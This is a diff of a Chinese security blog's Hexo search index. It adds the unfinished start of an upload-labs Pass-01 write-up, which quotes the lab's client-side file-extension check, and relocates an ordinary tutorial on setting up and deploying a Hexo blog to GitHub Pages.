+<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
+<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
+<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
+<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
+<p>未完。。。。。。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件泄露漏洞</title>
     <url>/posts/56132.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天刚做了一道<code>.git</code>文件泄露的题，在网上查了些资料，发现还有其他的文件泄露漏洞，现在来总结一下。</p>
@@ -2856,6 +2862,22 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>日常记录</title>
+    <url>/posts/42951.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>总结</category>
+      </categories>
+  </entry>
+  <entry>
     <title>日志</title>
     <url>/posts/32353.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -2873,22 +2895,6 @@ string substr(string, start, length)
       <tags>
         <tag>日志</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>日常记录</title>
-    <url>/posts/42951.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>总结</category>
-      </categories>
   </entry>
   <entry>
     <title>易错知识</title>
@@ -3215,8 +3221,8 @@ string substr(string, start, length)
         <category>Web</category>
       </categories>
       <tags>
-        <tag>WEB</tag>
         <tag>DVWA</tag>
+        <tag>WEB</tag>
       </tags>
   </entry>
   <entry>
@@ -3547,146 +3553,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>使用 hexo 搭建个人博客</title>
-    <url>/posts/28047.html</url>
-    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
-<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
-<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
-
-<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>
-
-<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
-<p>接着执行下列命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
-
-<p>缩写：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
-
-<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
-<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
-<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
-<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>
-
-<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
-<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
-
-<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
-<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
-<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
-<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>_config.yml</code> 中配置以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>
-
-<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
-<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
-
-<p>站内搜索</p>
-<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
-
-<p>接下来，创建一个页面来显示搜索引擎：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>
-
-<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
-<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
-<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
-<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
-<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>
-
-<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
-<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>
-
-<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
-<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
-<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
-<p>然后点击页面右上角的 New SSH key 按钮：</p>
-<p><img src="/posts/28047/new_ssh.png" alt></p>
-<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
-<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
-<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
-
-<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>
-
-<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p>
-<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>
-
-<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
-<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
-<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以不打草稿：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>
-
-<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
-
-<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
-<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
-<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
-<p>接着在本地博客文件夹下依次执行下列命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
-<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
-<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
-<p>然后点击页面右上角的 Change default branch 按钮:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
-<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
-<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
-<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>
-
-<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>
-
-<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网信息收集</title>
     <url>/posts/12754.html</url>
     <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先需要对当前所处的网络环境进行判断。判断涉及三个方面：</p>
@@ -3955,6 +3821,274 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>使用 hexo 搭建个人博客</title>
+    <url>/posts/28047.html</url>
+    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
+<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
+<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
+
+<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
